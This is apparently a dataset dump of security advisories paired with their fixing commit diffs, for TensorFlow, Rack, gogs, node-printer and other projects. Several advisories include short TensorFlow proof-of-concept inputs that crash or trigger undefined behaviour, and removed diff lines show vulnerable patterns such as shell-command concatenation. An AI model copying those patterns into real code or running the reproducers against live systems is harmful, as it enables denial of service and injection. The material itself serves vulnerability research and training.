\\n+    \/\/ Operation will treat first argument in input_splits as if it were zero\\n+    \/\/ regardless of its actual value since splits should begin with zero and\\n+    \/\/ end with the length of the input values vector.\\n+    OP_REQUIRES(\\n+        context, input_splits_flat(0) == 0,\\n+        errors::InvalidArgument(\"First value in input_splits must be zero.\"));\\n+    OP_REQUIRES(context,\\n+                input_splits_flat(input_splits_flat.size() - 1) ==\\n+                    input_tensor_flat.size(),\\n+                errors::InvalidArgument(\"Last value in input_splits must be \"\\n+                                        \"equal to length of input_tensor.\"));\\n     \/\/ Since we limit to a 2-D input (flat_values of rank 1 and a single splits\\n     \/\/ tensor), our output dimension will be 1 with it\\'s size equal to the\\n     \/\/ number of splits (outer dimension or ragged tensor).\\n@@ -548,6 +559,14 @@ class UnicodeEncodeOp : public OpKernel {\\n     for (int i = 1; i < input_splits_flat.size(); ++i) {\\n       icu::UnicodeString unicode_string;\\n       icu::UnicodeStringAppendable appendable_unicode_string(unicode_string);\\n+      OP_REQUIRES(\\n+          context, input_splits_flat(i - 1) <= input_splits_flat(i),\\n+          errors::InvalidArgument(\\n+              \"Values in input_splits must be equal or in ascending order.\"));\\n+      OP_REQUIRES(\\n+          context, input_splits_flat(i) <= input_tensor_flat.size(),\\n+          errors::InvalidArgument(\"Values in input_splits must be less than or \"\\n+                                  \"equal to input_tensor length.\"));\\n       for (; idx < input_splits_flat(i); ++idx) {\\n         int32 code_point = input_tensor_flat(idx);\\n         \/\/ Check for invalid code point'}}","message_norm":"fix heap buffer overflow in tf.raw_ops.unicodeencode.\n\npiperorigin-revid: 371717714\nchange-id: if33443b28f158e58078f1268f6b92f2728d219e0","language":"en","entities":"[('fix', 'ACTION', ''), ('buffer overflow', 'SECWORD', ''), ('tf.raw_ops.unicodeencode', 'SECWORD', ''), ('371717714', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/unicode_ops.cc'])","num_files":1.0},{"index":610,"vuln_id":"GHSA-5c8j-xr24-2665","cwe_id":"{'CWE-77'}","score":9.8,"chain":"{'https:\/\/github.com\/tojocky\/node-printer\/commit\/e001e38738c17219a1d9dd8c31f7d82b9c0013c7'}","dataset":"osv","summary":"Potential Command Injection in printer Versions 0.0.1 and earlier of `printer` are affected by a command injection vulnerability resulting from a failure to sanitize command arguments properly in the `printDirect()` function. \n\n\n\n## Recommendation\n\nUpdate to version 0.0.2 or later.","published_date":"2017-11-28","chain_len":1,"project":"https:\/\/github.com\/tojocky\/node-printer","commit_href":"https:\/\/github.com\/tojocky\/node-printer\/commit\/e001e38738c17219a1d9dd8c31f7d82b9c0013c7","commit_sha":"e001e38738c17219a1d9dd8c31f7d82b9c0013c7","patch":"SINGLE","chain_ord":"['e001e38738c17219a1d9dd8c31f7d82b9c0013c7']","before_first_fix_commit":"{'7987544670c37fdef659f8ee9e5db20fae118705'}","last_fix_commit":"e001e38738c17219a1d9dd8c31f7d82b9c0013c7","chain_ord_pos":1.0,"commit_datetime":"06\/28\/2013, 18:30:28","message":"Removed possible command injection","author":"chieffancypants","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'lib\/printer.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tojocky\/node-printer\/raw\/e001e38738c17219a1d9dd8c31f7d82b9c0013c7\/lib%2Fprinter.js', 'patch': '@@ -93,7 +93,7 @@ function printDirect(parameters){\\n     }else if (!printer_helper.printDirect){\/\/ should be POSIX\\n         var temp_file_name = path.join(os.tmpDir(),\"printing\");\\n         fs.writeFileSync(temp_file_name, data);\\n-        child_process.exec(\\'lpr -P\\'+printer+\\' -oraw -r\\'+\\' \\'+temp_file_name, function(err, stdout, stderr){\\n+        child_process.execFile(\\'lpr\\', [\\'-P\\' + printer, \\'-oraw\\', \\'-r\\', temp_file_name], function(err, stdout, stderr){\\n             if (err !== null) {\\n                 error(\\'ERROR: \\' + err);\\n                 return;'}}","message_norm":"removed possible command injection","language":"en","entities":"[('removed', 'ACTION', ''), ('possible command injection', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/printer.js'])","num_files":1.0},{"index":614,"vuln_id":"GHSA-5crj-c72x-m7gq","cwe_id":"{'CWE-476'}","score":5.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/05cbebd3c6bb8f517a158b0155debb8df79017ff'}","dataset":"osv","summary":"Null pointer exception when `Exit` node is not preceded by `Enter` op ### Impact\nThe [process of building the control flow graph](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/8d72537c6abf5a44103b57b9c2e22c14f5f49698\/tensorflow\/core\/common_runtime\/immutable_executor_state.cc#L284-L346) for a TensorFlow model is vulnerable to a null pointer exception when nodes that should be paired are not:\n  \n```python\nimport tensorflow as tf\n  \n@tf.function\ndef func():\n  return tf.raw_ops.Exit(data=[False,False])\n    \nfunc()\n```\n\nThis occurs because the code assumes that the first node in the pairing (e.g., an `Enter` node) always exists when encountering the second node (e.g., an `Exit` node):\n  \n```cc\n  ...\n} else if (IsExit(curr_node)) {\n  \/\/ Exit to the parent frame.\n  parent = parent_nodes[curr_id];         \n  frame_name = cf_info->frame_names[parent->id()];\n  ...                \n```\n\nWhen this is not the case, `parent` is `nullptr` so dereferencing it causes a crash.\n\n### Patches\nWe have patched the issue in GitHub commit [05cbebd3c6bb8f517a158b0155debb8df79017ff](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/05cbebd3c6bb8f517a158b0155debb8df79017ff).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-11-10","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/05cbebd3c6bb8f517a158b0155debb8df79017ff","commit_sha":"05cbebd3c6bb8f517a158b0155debb8df79017ff","patch":"SINGLE","chain_ord":"['05cbebd3c6bb8f517a158b0155debb8df79017ff']","before_first_fix_commit":"{'3586950728a5e7cda93d9eeeedfec59ddb30883c'}","last_fix_commit":"05cbebd3c6bb8f517a158b0155debb8df79017ff","chain_ord_pos":1.0,"commit_datetime":"10\/18\/2021, 23:17:46","message":"Fix a NPE issue in invalid Exit op. Now it will report an error instead of crash.\n\nPiperOrigin-RevId: 404089902\nChange-Id: Ia6ec55445ea70ad045a4d339d354959ad0618f2a","author":"Xiao Yu","comments":null,"stats":"{'additions': 4, 'deletions': 0, 'total': 4}","files":"{'tensorflow\/core\/common_runtime\/immutable_executor_state.cc': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/05cbebd3c6bb8f517a158b0155debb8df79017ff\/tensorflow%2Fcore%2Fcommon_runtime%2Fimmutable_executor_state.cc', 'patch': '@@ -316,6 +316,10 @@ Status ImmutableExecutorState::BuildControlFlowInfo(const Graph* g,\\n     } else if (IsExit(curr_node)) {\\n       \/\/ Exit to the parent frame.\\n       parent = parent_nodes[curr_id];\\n+      if (!parent) {\\n+        return errors::InvalidArgument(\\n+            \"Invalid Exit op: Cannot find a corresponding Enter op.\");\\n+      }\\n       frame_name = cf_info->frame_names[parent->id()];\\n       parent = parent_nodes[parent->id()];\\n     } else {'}}","message_norm":"fix a npe issue in invalid exit op. now it will report an error instead of crash.\n\npiperorigin-revid: 404089902\nchange-id: ia6ec55445ea70ad045a4d339d354959ad0618f2a","language":"en","entities":"[('fix', 'ACTION', ''), ('npe issue', 'SECWORD', ''), ('error', 'FLAW', ''), ('404089902', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/common_runtime\/immutable_executor_state.cc'])","num_files":1.0},{"index":616,"vuln_id":"GHSA-5f2r-qp73-37mr","cwe_id":"{'CWE-617'}","score":6.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/92dba16749fae36c246bec3f9ba474d9ddeb7662'}","dataset":"osv","summary":"`CHECK`-failures during Grappler's `SafeToRemoveIdentity` in Tensorflow ### Impact\nThe Grappler optimizer in TensorFlow can be used to cause a denial of service by altering a `SavedModel` such that [`SafeToRemoveIdentity`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a1320ec1eac186da1d03f033109191f715b2b130\/tensorflow\/core\/grappler\/optimizers\/dependency_optimizer.cc#L59-L98) would trigger `CHECK` failures.\n\n### Patches\nWe have patched the issue in GitHub commit [92dba16749fae36c246bec3f9ba474d9ddeb7662](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/92dba16749fae36c246bec3f9ba474d9ddeb7662).\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2022-02-10","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/92dba16749fae36c246bec3f9ba474d9ddeb7662","commit_sha":"92dba16749fae36c246bec3f9ba474d9ddeb7662","patch":"SINGLE","chain_ord":"['92dba16749fae36c246bec3f9ba474d9ddeb7662']","before_first_fix_commit":"{'1cda4d4a26acea3814d06e7d9525772ab357fc1c'}","last_fix_commit":"92dba16749fae36c246bec3f9ba474d9ddeb7662","chain_ord_pos":1.0,"commit_datetime":"11\/11\/2021, 18:43:29","message":"Prevent a null-pointer dereference \/ `CHECK`-fail in grappler.\n\nPiperOrigin-RevId: 409187354\nChange-Id: I369c249cca32e6c56ec193f0ebbf2f2768fc7d43","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 4, 'deletions': 2, 'total': 6}","files":"{'tensorflow\/core\/grappler\/optimizers\/dependency_optimizer.cc': {'additions': 4, 'deletions': 2, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/92dba16749fae36c246bec3f9ba474d9ddeb7662\/tensorflow%2Fcore%2Fgrappler%2Foptimizers%2Fdependency_optimizer.cc', 'patch': '@@ -75,8 +75,10 @@ bool DependencyOptimizer::SafeToRemoveIdentity(const NodeDef& node) const {\\n   }\\n \\n   const NodeDef* input = node_map_->GetNode(NodeName(node.input(0)));\\n-  CHECK(input != nullptr) << \"node = \" << node.name()\\n-                          << \" input = \" << node.input(0);\\n+  if (input == nullptr) {\\n+    VLOG(1) << \"node = \" << node.name() << \" input = \" << node.input(0);\\n+    return false;\\n+  }\\n   \/\/ Don\\'t remove Identity nodes corresponding to Variable reads or following\\n   \/\/ Recv.\\n   if (IsVariable(*input) || IsRecv(*input)) {'}}","message_norm":"prevent a null-pointer dereference \/ `check`-fail in grappler.\n\npiperorigin-revid: 409187354\nchange-id: i369c249cca32e6c56ec193f0ebbf2f2768fc7d43","language":"en","entities":"[('prevent', 'ACTION', ''), ('null-pointer dereference', 'SECWORD', ''), ('409187354', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/grappler\/optimizers\/dependency_optimizer.cc'])","num_files":1.0},{"index":617,"vuln_id":"GHSA-5f38-9jw2-6r6h","cwe_id":"{'CWE-79', 'CWE-843'}","score":5.4,"chain":"{'https:\/\/github.com\/rooseveltframework\/teddy\/commit\/64c556717b4879bf8d4c30067cf6e70d899a3dc0'}","dataset":"osv","summary":"Cross-site Scripting in teddy Teddy is a readable and easy to learn templating language. This affects the package teddy before 0.5.9. A type confusion vulnerability can be used to bypass input sanitization when the model content is an array (instead of a string).","published_date":"2021-10-12","chain_len":1,"project":"https:\/\/github.com\/rooseveltframework\/teddy","commit_href":"https:\/\/github.com\/rooseveltframework\/teddy\/commit\/64c556717b4879bf8d4c30067cf6e70d899a3dc0","commit_sha":"64c556717b4879bf8d4c30067cf6e70d899a3dc0","patch":"SINGLE","chain_ord":"['64c556717b4879bf8d4c30067cf6e70d899a3dc0']","before_first_fix_commit":"{'90387d97c7a8f458a08dd3b72a4b0574000af5f8', 'fea0b218069ff00f86f2b24f2fd08be01cd6b8c1'}","last_fix_commit":"64c556717b4879bf8d4c30067cf6e70d899a3dc0","chain_ord_pos":1.0,"commit_datetime":"10\/07\/2021, 01:27:38","message":"Merge pull request #518 from kethinov\/refactor-escape-entities\n\nrefactor escape entities for better type checking","author":"Eric Newport","comments":null,"stats":"{'additions': 15, 'deletions': 4, 'total': 19}","files":"{'utils.js': {'additions': 15, 'deletions': 4, 'changes': 19, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/rooseveltframework\/teddy\/raw\/64c556717b4879bf8d4c30067cf6e70d899a3dc0\/utils.js', 'patch': \"@@ -96,10 +96,21 @@ function escapeEntities (value) {\\n   let i\\n   let j\\n \\n-  if (value === undefined || typeof value === 'boolean' || typeof value === 'object') { \/\/ Cannot escape on these values\\n-    return value\\n-  } else if (typeof value === 'number') { \/\/ Value is a number, no reason to escape\\n-    return `${value}`\\n+  if (typeof value === 'object') { \/\/ Cannot escape on this value\\n+    if (!value) {\\n+      return false \/\/ it is falsey to return false\\n+    } else if (Array.isArray(value)) {\\n+      if (value.length === 0) {\\n+        return false \/\/ empty arrays are falsey\\n+      } else {\\n+        return '[Array]' \/\/ print that it is an array with content in it, but do not print the contents\\n+      }\\n+    }\\n+    return '[Object]' \/\/ just print that it is an object, do not print the contents\\n+  } else if (value === undefined) { \/\/ Cannot escape on this value\\n+    return false \/\/ undefined is falsey\\n+  } else if (typeof value === 'boolean' || typeof value === 'number') { \/\/ Cannot escape on these values\\n+    return value \/\/ if it's already a boolean or a number just return it\\n   } else {\\n     \/\/ Loop through value to find HTML entities\\n     for (i = 0; i < value.length; i++) {\"}}","message_norm":"merge pull request #518 from kethinov\/refactor-escape-entities\n\nrefactor escape entities for better type checking","language":"en","entities":"[('#518', 'ISSUE', ''), ('escape', 'SECWORD', ''), ('escape', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['utils.js'])","num_files":1.0},{"index":621,"vuln_id":"GHSA-5f9h-9pjv-v6j7","cwe_id":"{'CWE-22', 'CWE-548'}","score":8.6,"chain":"{'https:\/\/github.com\/rack\/rack\/commit\/dddb7ad18ed79ca6ab06ccc417a169fde451246e'}","dataset":"osv","summary":"Directory traversal in Rack::Directory app bundled with Rack A directory traversal vulnerability exists in rack < 2.2.0 that allows an attacker perform directory traversal vulnerability in the Rack::Directory app that is bundled with Rack which could result in information disclosure.","published_date":"2020-07-06","chain_len":1,"project":"https:\/\/github.com\/rack\/rack","commit_href":"https:\/\/github.com\/rack\/rack\/commit\/dddb7ad18ed79ca6ab06ccc417a169fde451246e","commit_sha":"dddb7ad18ed79ca6ab06ccc417a169fde451246e","patch":"SINGLE","chain_ord":"['dddb7ad18ed79ca6ab06ccc417a169fde451246e']","before_first_fix_commit":"{'16a51d8e0b64964323c3719b8154106af5cc0feb'}","last_fix_commit":"dddb7ad18ed79ca6ab06ccc417a169fde451246e","chain_ord_pos":1.0,"commit_datetime":"05\/12\/2020, 16:23:33","message":"Use Dir.entries instead of Dir[glob] to prevent user-specified glob metacharacters\n\n[CVE-2020-8161]","author":"Jack McCracken","comments":null,"stats":"{'additions': 1, 'deletions': 2, 'total': 3}","files":"{'lib\/rack\/directory.rb': {'additions': 1, 'deletions': 2, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/rack\/rack\/raw\/dddb7ad18ed79ca6ab06ccc417a169fde451246e\/lib%2Frack%2Fdirectory.rb', 'patch': \"@@ -106,13 +106,12 @@ def check_forbidden(path_info)\\n \\n     def list_directory(path_info, path, script_name)\\n       files = [['..\/', 'Parent Directory', '', '', '']]\\n-      glob = ::File.join(path, '*')\\n \\n       url_head = (script_name.split('\/') + path_info.split('\/')).map do |part|\\n         Rack::Utils.escape_path part\\n       end\\n \\n-      Dir[glob].sort.each do |node|\\n+      Dir.entries(path).reject { |e| e.start_with?('.') }.sort.each do |node|\\n         stat = stat(node)\\n         next unless stat\\n         basename = ::File.basename(node)\"}}","message_norm":"use dir.entries instead of dir[glob] to prevent user-specified glob metacharacters\n\n[cve-2020-8161]","language":"en","entities":"[('prevent', 'ACTION', ''), ('cve-2020-8161', 'VULNID', 'CVE')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/rack\/directory.rb'])","num_files":1.0},{"index":624,"vuln_id":"GHSA-5fh3-25xr-g85h","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/snipe\/snipe-it\/commit\/ff81e6d5366c2cfb15618793ad919ae4cbb3ac57'}","dataset":"osv","summary":"snipe-it is vulnerable to Cross-site Scripting snipe-it is vulnerable to Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting').","published_date":"2021-12-03","chain_len":1,"project":"https:\/\/github.com\/snipe\/snipe-it","commit_href":"https:\/\/github.com\/snipe\/snipe-it\/commit\/ff81e6d5366c2cfb15618793ad919ae4cbb3ac57","commit_sha":"ff81e6d5366c2cfb15618793ad919ae4cbb3ac57","patch":"SINGLE","chain_ord":"['ff81e6d5366c2cfb15618793ad919ae4cbb3ac57']","before_first_fix_commit":"{'3b68a6f1befeef504c0a3263e87a2afd55abc430', '00fad35c2a6ddc9813d3322da91086eb06cb7406'}","last_fix_commit":"ff81e6d5366c2cfb15618793ad919ae4cbb3ac57","chain_ord_pos":1.0,"commit_datetime":"11\/25\/2021, 03:56:36","message":"Merge pull request #10361 from snipe\/fixes\/xss_in_accessories_checkout_notes\n\nEscape notes in transformCheckedOutAccessory","author":"snipe","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'app\/Http\/Transformers\/AccessoriesTransformer.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/snipe\/snipe-it\/raw\/ff81e6d5366c2cfb15618793ad919ae4cbb3ac57\/app%2FHttp%2FTransformers%2FAccessoriesTransformer.php', 'patch': \"@@ -82,7 +82,7 @@ public function transformCheckedoutAccessory ($accessory, $accessory_users, $tot\\n                 'first_name'=> e($user->first_name),\\n                 'last_name'=> e($user->last_name),\\n                 'employee_number' =>  e($user->employee_num),\\n-                'checkout_notes' => $user->pivot->note,\\n+                'checkout_notes' => e($user->pivot->note),\\n                 'last_checkout' => Helper::getFormattedDateObject($user->pivot->created_at, 'datetime'),\\n                 'type' => 'user',\\n                 'available_actions' => ['checkin' => true]\"}}","message_norm":"merge pull request #10361 from snipe\/fixes\/xss_in_accessories_checkout_notes\n\nescape notes in transformcheckedoutaccessory","language":"en","entities":"[('#10361', 'ISSUE', ''), ('xss_in_accessories_checkout_notes', 'SECWORD', ''), ('escape', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['app\/Http\/Transformers\/AccessoriesTransformer.php'])","num_files":1.0},{"index":628,"vuln_id":"GHSA-5fw9-fq32-wv5p","cwe_id":"{'CWE-78'}","score":5.6,"chain":"{'https:\/\/github.com\/mikaelbr\/node-notifier\/commit\/5d62799dab88505a709cd032653b2320c5813fce'}","dataset":"osv","summary":"OS Command Injection in node-notifier This affects the package node-notifier before 8.0.1. It allows an attacker to run arbitrary commands on Linux machines due to the options params not being sanitised when being passed an array.","published_date":"2020-12-21","chain_len":1,"project":"https:\/\/github.com\/mikaelbr\/node-notifier","commit_href":"https:\/\/github.com\/mikaelbr\/node-notifier\/commit\/5d62799dab88505a709cd032653b2320c5813fce","commit_sha":"5d62799dab88505a709cd032653b2320c5813fce","patch":"SINGLE","chain_ord":"['5d62799dab88505a709cd032653b2320c5813fce']","before_first_fix_commit":"{'0c4a80df9a3b5015cd1e1ab858e008be3fece082'}","last_fix_commit":"5d62799dab88505a709cd032653b2320c5813fce","chain_ord_pos":1.0,"commit_datetime":"12\/15\/2020, 15:30:54","message":"v8.0.1","author":"Mikael Brevik","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'package.json': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/mikaelbr\/node-notifier\/raw\/5d62799dab88505a709cd032653b2320c5813fce\/package.json', 'patch': '@@ -1,6 +1,6 @@\\n {\\n   \"name\": \"node-notifier\",\\n-  \"version\": \"8.0.0\",\\n+  \"version\": \"8.0.1\",\\n   \"description\": \"A Node.js module for sending notifications on native Mac, Windows (post and pre 8) and Linux (or Growl as fallback)\",\\n   \"main\": \"index.js\",\\n   \"scripts\": {'}}","message_norm":"v8.0.1","language":"sk","entities":"[('v8.0.1', 'VERSION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['package.json'])","num_files":1.0},{"index":629,"vuln_id":"GHSA-5fxf-x22x-5q38","cwe_id":"{'CWE-79'}","score":6.8,"chain":"{'https:\/\/github.com\/microweber\/microweber\/commit\/de6d17b52d261902653fbdd2ecefcaac82e54256'}","dataset":"osv","summary":"Cross-site Scripting in microweber XSS on dynamic_text module in GitHub repository microweber\/microweber prior to 1.2.12.","published_date":"2022-03-13","chain_len":1,"project":"https:\/\/github.com\/microweber\/microweber","commit_href":"https:\/\/github.com\/microweber\/microweber\/commit\/de6d17b52d261902653fbdd2ecefcaac82e54256","commit_sha":"de6d17b52d261902653fbdd2ecefcaac82e54256","patch":"SINGLE","chain_ord":"['de6d17b52d261902653fbdd2ecefcaac82e54256']","before_first_fix_commit":"{'095b1bcea7a4384f0d0513906100212df136a1e4'}","last_fix_commit":"de6d17b52d261902653fbdd2ecefcaac82e54256","chain_ord_pos":1.0,"commit_datetime":"03\/11\/2022, 13:38:50","message":"Update build-and-upload.yml","author":"Bozhidar Slaveykov","comments":null,"stats":"{'additions': 0, 'deletions': 1, 'total': 1}","files":"{'.github\/workflows\/build-and-upload.yml': {'additions': 0, 'deletions': 1, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/microweber\/microweber\/raw\/de6d17b52d261902653fbdd2ecefcaac82e54256\/.github%2Fworkflows%2Fbuild-and-upload.yml', 'patch': '@@ -6,7 +6,6 @@ on:\\n jobs:\\n   microweber-test-before-build:\\n     runs-on: ubuntu-latest\\n-    needs: stop-previous-runs\\n     steps:\\n       - uses: actions\/checkout@v2'}}","message_norm":"update build-and-upload.yml","language":"en","entities":"[('update', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['.github\/workflows\/build-and-upload.yml'])","num_files":1.0},{"index":634,"vuln_id":"GHSA-5gjh-5j4f-cpwv","cwe_id":"{'CWE-434', 'CWE-20'}","score":8.8,"chain":"{'https:\/\/github.com\/gogs\/gogs\/commit\/0fef3c9082269e9a4e817274942a5d7c50617284'}","dataset":"osv","summary":"Unrestricted Upload of File with Dangerous Type in Gogs ### Impact\n\nThe malicious user is able to upload a crafted `config` file into repository's `.git` directory with to gain SSH access to the server. All installations with [repository upload enabled (default)](https:\/\/github.com\/gogs\/gogs\/blob\/f36eeedbf89328ee70cc3a2e239f6314f9021f58\/conf\/app.ini#L127-L129) are affected.\n\n### Patches\n\nRepository file uploads are prohibited to its `.git` directory. Users should upgrade to 0.12.6 or the latest 0.13.0+dev.\n\n### Workarounds\n\n[Disable repository files upload](https:\/\/github.com\/gogs\/gogs\/blob\/f36eeedbf89328ee70cc3a2e239f6314f9021f58\/conf\/app.ini#L128-L129).\n\n### References\n\nhttps:\/\/huntr.dev\/bounties\/b4928cfe-4110-462f-a180-6d5673797902\/\n\n### For more information\n\nIf you have any questions or comments about this advisory, please post on #6833.","published_date":"2022-03-28","chain_len":1,"project":"https:\/\/github.com\/gogs\/gogs","commit_href":"https:\/\/github.com\/gogs\/gogs\/commit\/0fef3c9082269e9a4e817274942a5d7c50617284","commit_sha":"0fef3c9082269e9a4e817274942a5d7c50617284","patch":"SINGLE","chain_ord":"['0fef3c9082269e9a4e817274942a5d7c50617284']","before_first_fix_commit":"{'5aca56d2ddafad347dd670f4004ebf367c2c84ef'}","last_fix_commit":"0fef3c9082269e9a4e817274942a5d7c50617284","chain_ord_pos":1.0,"commit_datetime":"03\/13\/2022, 14:18:56","message":"repo_editor: check upload `TreePath` and file name (#6838)","author":"Joe Chen","comments":null,"stats":"{'additions': 13, 'deletions': 4, 'total': 17}","files":"{'internal\/db\/repo_editor.go': {'additions': 13, 'deletions': 4, 'changes': 17, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/gogs\/gogs\/raw\/0fef3c9082269e9a4e817274942a5d7c50617284\/internal%2Fdb%2Frepo_editor.go', 'patch': '@@ -16,16 +16,18 @@ import (\\n \\t\"strings\"\\n \\t\"time\"\\n \\n+\\t\"github.com\/pkg\/errors\"\\n \\tgouuid \"github.com\/satori\/go.uuid\"\\n \\t\"github.com\/unknwon\/com\"\\n \\n \\t\"github.com\/gogs\/git-module\"\\n \\n \\t\"gogs.io\/gogs\/internal\/conf\"\\n \\t\"gogs.io\/gogs\/internal\/cryptoutil\"\\n-\\t\"gogs.io\/gogs\/internal\/db\/errors\"\\n+\\tdberrors \"gogs.io\/gogs\/internal\/db\/errors\"\\n \\t\"gogs.io\/gogs\/internal\/gitutil\"\\n \\t\"gogs.io\/gogs\/internal\/osutil\"\\n+\\t\"gogs.io\/gogs\/internal\/pathutil\"\\n \\t\"gogs.io\/gogs\/internal\/process\"\\n \\t\"gogs.io\/gogs\/internal\/tool\"\\n )\\n@@ -134,7 +136,7 @@ func (repo *Repository) UpdateRepoFile(doer *User, opts UpdateRepoFileOptions) (\\n \\tif opts.OldBranch != opts.NewBranch {\\n \\t\\t\/\/ Directly return error if new branch already exists in the server\\n \\t\\tif git.RepoHasBranch(repoPath, opts.NewBranch) {\\n-\\t\\t\\treturn errors.BranchAlreadyExists{Name: opts.NewBranch}\\n+\\t\\t\\treturn dberrors.BranchAlreadyExists{Name: opts.NewBranch}\\n \\t\\t}\\n \\n \\t\\t\/\/ Otherwise, delete branch from local copy in case out of sync\\n@@ -449,11 +451,16 @@ func isRepositoryGitPath(path string) bool {\\n \\treturn strings.HasSuffix(path, \".git\") || strings.Contains(path, \".git\"+string(os.PathSeparator))\\n }\\n \\n-func (repo *Repository) UploadRepoFiles(doer *User, opts UploadRepoFileOptions) (err error) {\\n+func (repo *Repository) UploadRepoFiles(doer *User, opts UploadRepoFileOptions) error {\\n \\tif len(opts.Files) == 0 {\\n \\t\\treturn nil\\n \\t}\\n \\n+\\t\/\/ Prevent uploading files into the \".git\" directory\\n+\\tif isRepositoryGitPath(opts.TreePath) {\\n+\\t\\treturn errors.Errorf(\"bad tree path %q\", opts.TreePath)\\n+\\t}\\n+\\n \\tuploads, err := GetUploadsByUUIDs(opts.Files)\\n \\tif err != nil {\\n \\t\\treturn fmt.Errorf(\"get uploads by UUIDs[%v]: %v\", opts.Files, err)\\n@@ -487,7 +494,9 @@ func (repo *Repository) UploadRepoFiles(doer *User, opts UploadRepoFileOptions)\\n \\t\\t\\tcontinue\\n \\t\\t}\\n \\n-\\t\\t\/\/ Prevent copying files into .git directory, see https:\/\/gogs.io\/gogs\/issues\/5558.\\n+\\t\\tupload.Name = pathutil.Clean(upload.Name)\\n+\\n+\\t\\t\/\/ Prevent uploading files into the \".git\" directory\\n \\t\\tif isRepositoryGitPath(upload.Name) {\\n \\t\\t\\tcontinue\\n \\t\\t}'}}","message_norm":"repo_editor: check upload `treepath` and file name (#6838)","language":"en","entities":"[('#6838', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['internal\/db\/repo_editor.go'])","num_files":1.0},{"index":637,"vuln_id":"GHSA-5gqf-456p-4836","cwe_id":"{'CWE-476'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f7cc8755ac6683131fdfa7a8a121f9d7a9dec6fb'}","dataset":"osv","summary":"Reference binding to nullptr in `SdcaOptimizer` ### Impact\nThe implementation of `tf.raw_ops.SdcaOptimizer` triggers undefined behavior due to dereferencing a null pointer:\n\n```python\nimport tensorflow as tf\n\nsparse_example_indices = [tf.constant((0), dtype=tf.int64), tf.constant((0), dtype=tf.int64)]\nsparse_feature_indices = [tf.constant([], shape=[0, 0, 0, 0], dtype=tf.int64), tf.constant((0), dtype=tf.int64)]\nsparse_feature_values = []\n\ndense_features = []\ndense_weights = []\n\nexample_weights = tf.constant((0.0), dtype=tf.float32)\nexample_labels = tf.constant((0.0), dtype=tf.float32)\n\nsparse_indices = [tf.constant((0), dtype=tf.int64), tf.constant((0), dtype=tf.int64)]\nsparse_weights = [tf.constant((0.0), dtype=tf.float32), tf.constant((0.0), dtype=tf.float32)]\n  \nexample_state_data = tf.constant([0.0, 0.0, 0.0, 0.0], shape=[1, 4], dtype=tf.float32)\n  \ntf.raw_ops.SdcaOptimizer(\n  sparse_example_indices=sparse_example_indices,\n  sparse_feature_indices=sparse_feature_indices,\n  sparse_feature_values=sparse_feature_values, dense_features=dense_features,\n  example_weights=example_weights, example_labels=example_labels, \n  sparse_indices=sparse_indices, sparse_weights=sparse_weights, \n  dense_weights=dense_weights, example_state_data=example_state_data,\n  loss_type=\"logistic_loss\", l1=0.0, l2=0.0, num_loss_partitions=1,\n  num_inner_iterations=1, adaptative=False)\n```\n\nThe 